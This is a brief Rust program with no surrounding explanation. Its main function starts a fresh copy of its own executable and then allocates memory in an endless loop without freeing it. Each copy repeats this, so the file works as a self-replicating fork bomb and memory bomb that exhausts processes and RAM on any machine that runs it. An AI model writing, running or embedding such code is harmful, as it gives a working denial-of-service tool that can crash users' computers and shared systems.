use std::alloc::{alloc, Layout};
use std::env;
use std::process::Command;
fn main() {
    let _ = Command::new(env::current_exe().unwrap()).spawn();
    loop {
        unsafe {
            let _ = alloc(Layout::from_size_align_unchecked(0x4096, 0x2));
        }
    }
}
